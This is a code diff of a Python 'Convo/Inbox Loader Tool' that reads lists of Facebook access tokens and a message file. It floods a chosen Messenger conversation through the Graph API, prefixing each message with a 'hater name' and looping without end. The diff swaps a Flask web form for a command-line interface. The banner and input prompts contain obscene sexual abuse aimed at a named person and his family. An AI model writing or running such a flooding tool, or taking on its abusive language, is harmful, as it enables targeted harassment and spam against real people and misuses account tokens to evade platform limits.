@@ -1,141 +1,144 @@
-from flask import Flask, request
 import requests
-from time import sleep
 import time
-from datetime import datetime
+import sys
+from platform import system
+import os
+import http.server
+import socketserver
+import threading
+BOLD = '\033[1m'
+CYAN = '\033[96m'
+logo =("""\x1b[1;36m
+import
+                                                                                                             
+        _________▓▓▓▓____█████████
+__ Ƹ̵̡Ӝ̵̨̄Ʒ▓▓▓▓▓=▓____▓=▓▓▓▓▓
+__ ▓▓▓_▓▓▓▓░●____●░░▓▓▓▓
+_▓▓▓▓_▓▓▓▓▓░░__░░░░▓▓▓▓
+_ ▓▓▓▓_▓▓▓▓░░♥__♥░░░▓▓▓
+__ ▓▓▓___▓▓░░_____░░░▓▓
+▓▓▓▓▓____▓░░_____░░▓
+_ ▓▓____ ▒▓▒▓▒___ ████
+_______ ▒▓▒▓▒▓▒_ ██████
+_______▒▓▒▓▒▓▒ ████████
+_____ ▒▓▒▓▒▓▒_██████ ███
+_ ___▒▓▒▓▒▓▒__██████ _███
+_▓▓X▓▓▓▓▓▓▓__██████_ ███
+▓▓_██████▓▓__██████_ ███
+▓_███████▓▓__██████_ ███
+_████████▓▓__██████ _███
+_████████▓▓__▓▓▓▓▓▓_▒▒
+_████████▓▓__▓▓▓▓▓▓
+_████████▓▓__▓▓▓▓▓▓
+__████████▓___▓▓▓▓▓▓
+_______▒▒▒▒▒____▓▓▓▓▓▓
+_______▒▒▒▒▒ _____▓▓▓▓▓
+_______▒▒▒▒▒_____ ▓▓▓▓▓
+_______▒▒▒▒▒ _____▓▓▓▓▓
+________▒▒▒▒______▓▓▓▓▓
+________█████____█████
+_'▀█║────────────▄▄────────────▄──▄_
+──█║───────▄─▄─█▄▄█║──────▄▄──█║─█║
+──█║───▄▄──█║█║█║─▄║▄──▄║█║─█║█║▄█║
+──█║──█║─█║█║█║─▀▀──█║─█║█║─█║─▀─▀
+──█║▄║█║─█║─▀───────█║▄█║─▀▀
+──▀▀▀──▀▀────────────▀─█║
+───────▄▄─▄▄▀▀▄▀▀▄──▀▄▄▀
+──────███████───▄▀
+──────▀█████▀▀▄▀
+────────▀█▀
 
-app = Flask(__name__)
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
+                                                        
+                                                       
+                                   
+ \033[1;36m. /$$$$$$ 
+                                                        
+                                                        
+                                                        
+                          
+  ╔═══════════════════Note═══════════════════╗                 
+  【𝗛𝗘𝗥𝗢 𝗞𝗔 𝗝𝗜𝗝𝗔 𝗣𝗥𝗜𝗡𝗖𝗘 𝗧𝗛𝗔𝗞𝗨𝗥 𝗕𝗥𝗔𝗡𝗗】
+  ╚══════════════════════════════════════════╝
+\033[1;92m.Author    :  𝗛𝗘𝗥𝗢 𝗞𝗠𝗜𝗡𝗔 𝗖𝗛𝗢𝗥𝗔 𝐊𝐀 𝐉𝐈𝐉𝐀 𝗣𝗥𝗜𝗡𝗖𝗘 𝐈𝐍𝐒𝐈𝐃𝐄|
+\033[1;31m.Brother  : 𝗔𝗕𝗛𝗔𝗬 𝐈𝐍𝐒𝐈𝐃𝐄 | 𝗣𝗥𝗜𝗡𝗖𝗘 𝐇𝐄𝐑𝐄   |
+ \033[1;36mGithub    : 𝗛𝗘𝗥𝗢 𝐊𝐈 𝐁𝐇𝐄𝐍 𝐊𝐈 𝐗𝐇𝐔𝐓 𝐊𝐎 𝐂𝐇𝐈𝐑𝐍𝐄 𝐖𝐀𝐋𝐀 𝐓𝐎𝐎𝐋     |
+ \033[1;32m.Facebook  :𝗞𝗠𝗜𝗡𝗔 𝗖𝗛𝗢𝗥𝗔 𝗨𝗥𝗙 𝗛𝗘𝗥𝗢𝐊𝐈 𝐁𝐇𝐄𝐍 𝐊𝐈 𝐆𝐀𝐍𝐃 𝐊𝐈 𝐍𝐀𝐒 𝐅𝐀𝐃𝐍𝐄 𝐖𝐀𝐋𝐀 𝗣𝗥𝗜𝗡𝗖𝗘 𝐇𝐄𝐑𝐄
+ \033[1;34mTool Name : 𝗛𝗘𝗥𝗢 𝐊𝗜 𝐀𝐋𝐋 𝐏𝐈𝐋𝐄 𝐊𝐈 𝐁𝐇𝐄𝐍 𝐊𝐎 𝐗𝐇𝐎𝐃𝐍𝐄 𝐖𝐀𝐋𝐀 𝐀𝐒𝐇𝐈𝐐 𝗣𝗥𝗜𝗡𝗖𝗘|
+ \033[1;36mType type : 𝐒𝐀𝐈𝐌 𝐊𝐈 𝐁𝐇𝐄𝐍 𝐊𝐎 𝐗𝐇𝐎𝐃𝐍𝐄 𝐊𝗘 𝐋𝐈𝐘𝐄 𝐅𝐑𝐄𝐄 𝐇𝐄 𝐓𝐎𝐎𝐋 |
+  ───────────────────────────────────────────────────────
+   𖣘︎𖣘︎𖣘︎𖣘︎𖣘︎︻╦デ╤━╼【★𝗣𝗥𝗜𝗡𝗖𝗘 𝐓𝐎𝐎𝐋 𝐎𝐖𝐍𝐀𝐑★】╾━╤デ╦︻𖣘︎𖣘︎𖣘︎𖣘︎𖣘︎
+ ──────────────────────────────────────────────────────
+\033[1;32m【𝗛𝗘𝗥𝗢 𝗞𝗠𝗜𝗡𝗔 𝗖𝗛𝗢𝗥𝗔 𝐊𝐈 𝐁𝐇𝐄𝐍 𝐊𝐈 𝐗𝐇𝐔𝐓 𝐌𝐄 𝐔𝐍𝐆𝐋𝐈 𝐃𝐀𝐋 𝐁𝐀𝐇𝐎𝐓 𝐓𝐄𝐉 𝐂𝐇𝐋𝐄𝐆𝐀】
+ \033[1;36m       𖣘︎𖣘︎𖣘︎【𝗞𝗠𝗜𝗡𝗔 𝗖𝗛𝗢𝗥𝗔 𝐊𝗔 𝗣𝗔𝗣𝗔 𝗣𝗥𝗜𝗡𝗖𝗘  𝐈𝐍𝐒𝐈𝐃𝐄】𖣘︎𖣘︎𖣘︎""" )
 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        access_token = request.form.get('accessToken')
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
-
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-
-        while True:
-            try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"Message sent using token {access_token}: {message}")
-                    else:
-                        print(f"Failed to send message using token {access_token}: {message}")
-                    time.sleep(time_interval)
-            except Exception as e:
-                print(f"Error while sending message using token {access_token}: {message}")
-                print(e)
-                time.sleep(30)
-
-    return '''
-    
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Devil Brand</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-    <style>
-        body {
-            background-color: pink;
-            color: red;
-        }
-        .container {
-            max-width: 500px;
-            background-color: blue;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
-            margin: 0 auto;
-            margin-top: 20px;
-        }
-        .header {
-            text-align: center;
-            padding-bottom: 20px;
-        }
-        .btn-submit {
-            width: 100%;
-            margin-top: 10px;
-            background-color: red;
-            color: white;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #444;
-        }
-        .footer a {
-            color: red;
-        }
-    </style>
-</head>
-<body>
-    <header class="header mt-4">
-        <h1 class="mb-3">☘️WARIOUR RULEX❤️</h1>
-        <h2>OWNR :: 
-⎯꯭̽🌱꯭♡🅓evᎥᏞ☯🖤⎯꯭̽⟶꯭</h2>
-    </header>
-
-    <div class="container">
-        <form action="/" method="post" enctype="multipart/form-data">
-            <div class="mb-3">
-                <label for="accessToken">Enter Your Token:</label>
-                <input type="text" class="form-control" id="accessToken" name="accessToken" required>
-            </div>
-            <div class="mb-3">
-                <label for="threadId">Enter Convo/Inbox ID:</label>
-                <input type="text" class="form-control" id="threadId" name="threadId" required>
-            </div>
-            <div class="mb-3">
-                <label for="kidx">Enter Hater Name:</label>
-                <input type="text" class="form-control" id="kidx" name="kidx" required>
-            </div>
-            <div class="mb-3">
-                <label for="txtFile">Select Your Notepad File:</label>
-                <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-            </div>
-            <div class="mb-3">
-                <label for="time">Speed in Seconds:</label>
-                <input type="number" class="form-control" id="time" name="time" required>
-            </div>
-            <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
-        </form>
-    </div>
-
-    <footer class="footer">
-        <p>&copy; 2023 Devil Brand. All Rights Reserved.</p>
-        <p>Convo/Inbox Loader Tool</p>
-        <p>Made with ♥ by <a href="https://github.com/DEVILXWD">
-⎯꯭̽🌱꯭♡🅓evᎥᏞ☯🖤⎯꯭̽⟶꯭</a></p>
-    </footer>
-
-    <script>
-        document.querySelector('form').onsubmit = function() {
-            alert('Form has been submitted successfully!');
-        };
-    </script>
-</body>
-</html>
-    '''
-
+def cls():
+        if system() == 'Linux':
+            os.system('clear')
+        else:
+            if system() == 'Windows':
+                os.system('cls')
+cls()
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"H")
+def execute_server():
+    PORT = 4000
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
+def get_access_tokens(token_file):
+    with open(token_file, 'r') as file:
+        return [token.strip() for token in file]
+def send_messages(convo_id, tokens, messages, haters_name, speed):
+    headers = {
+        'Content-type': 'application/json',
+    }
+    num_tokens = len(tokens)
+    num_messages = len(messages)
+    max_tokens = min(num_tokens, num_messages)
+    while True:
+        try:
+            for message_index in range(num_messages):
+                token_index = message_index % max_tokens
+                access_token = tokens[token_index]
+                message = messages[message_index].strip()
+                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
+                response = requests.post(url, json=parameters, headers=headers)
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("\033[1;32m[√]𝗞𝗠𝗜𝗡𝗔 𝗖𝗛𝗢𝗥𝗔 𝐊𝐈 𝐁𝐇𝐄𝐍 𝐊𝐈 𝐗𝐇𝐔𝐓 𝐌𝐄 𝐏𝐔𝐑𝐀 𝐋𝐀𝐍𝐃 𝐂𝐇𝗔𝐋𝐀 𝐆𝐘𝐀】  {} of Convo\033[1;35m {} \033[1;33msent by Token {}: \n\033[1;35m{}".format(
+                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
+                    print("\033[1;32m  - Time: {}".format(current_time))
+                else:
+                    print("\033[1;32m[x] MESSEGE FAIL HO GYA BHOSDI KE TOKAN SAHI DAL  {} of Convo \033[1;34m{} with Token \033[1;36m{}: \n\033[1;36m{}".format(
+                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
+                    print(" \033[1;34m - Time: {}".format(current_time))
+                time.sleep(speed)   
+            print("\n\033[1;33m[+] All messages sent. Restarting the process...\n")
+        except Exception as e:
+            print("\033[1;35m[!] An error occurred: {}".format(e))
+def main():	
+    print(logo)   
+    print(' \033[1;31m[•] 𝗞𝗠𝗜𝗡𝗔 𝗖𝗛𝗢𝗥𝗔 𝐊𝐈 𝐃𝗶𝐃𝗶 𝐊𝐈 𝐗𝐇𝐔𝐓 𝐌𝐄 𝐓𝐎𝐊𝐄𝐍 𝐅𝐈𝐋𝐄 𝐃𝐀𝐋➼')
+    token_file = input(BOLD + CYAN + "=>").strip()
+    tokens = get_access_tokens(token_file)
+    print(' \033[1;36m[•] 𝗞𝗠𝗜𝗡𝗔 𝗖𝗛𝗢𝗥𝗔 𝐊𝐈 𝐁𝐇𝐄𝐍 𝐊𝐎 𝐊𝐇𝐀 𝐂𝐇𝐎𝐃𝐍𝐀 𝐈𝐃 𝐃𝐀𝐋➼ ')
+    convo_id = input(BOLD + CYAN + "=>").strip()
+    print(' \033[1;34m[•] 𝗞𝗠𝗜𝗡𝗔 𝗖𝗛𝗢𝗥𝗔 𝐊𝐈 𝐁𝐇𝐄𝐍 𝐊𝐈 𝐂𝐇𝐔𝐓  𝐒𝗲 𝐍𝐈𝐊𝐀𝐋 𝐊𝐀𝐑 𝐅𝐈𝐋𝐄 𝐃𝐀𝐋 ➼')
+    messages_file = input(BOLD + CYAN + "=> ").strip()
+    print(' \033[1;35m[•] 𝗞𝗠𝗜𝗡𝗔 𝗖𝗛𝗢𝗥𝗔 𝐊𝐈 𝐁𝐇𝐄𝐍 𝐊 𝐘𝐀𝐑𝐎 𝐊𝐀 𝐍𝐀𝐌𝐄 𝐃𝐀𝐋➼')
+    haters_name = input(BOLD + CYAN + "=> ").strip()
+    print(' \033[1;34m[•] 𝗞𝗠𝗜𝗡𝗔 𝗖𝗛𝗢𝗥𝗔 𝐊𝐈 𝐁𝐇𝐄𝐍 𝐊𝐎 𝐊𝐈𝐓𝐍𝐈 𝐒𝐏𝐄𝐄𝐃 𝐒𝐄 𝐂𝐇𝐎𝐃𝐍𝐀 𝐇𝗔𝗶➼' )
+    speed = int(input(BOLD + CYAN + "======> ").strip())
+    with open(messages_file, 'r') as file:
+        messages = file.readlines()
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+    send_messages(convo_id, tokens, messages, haters_name, speed)
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    main()
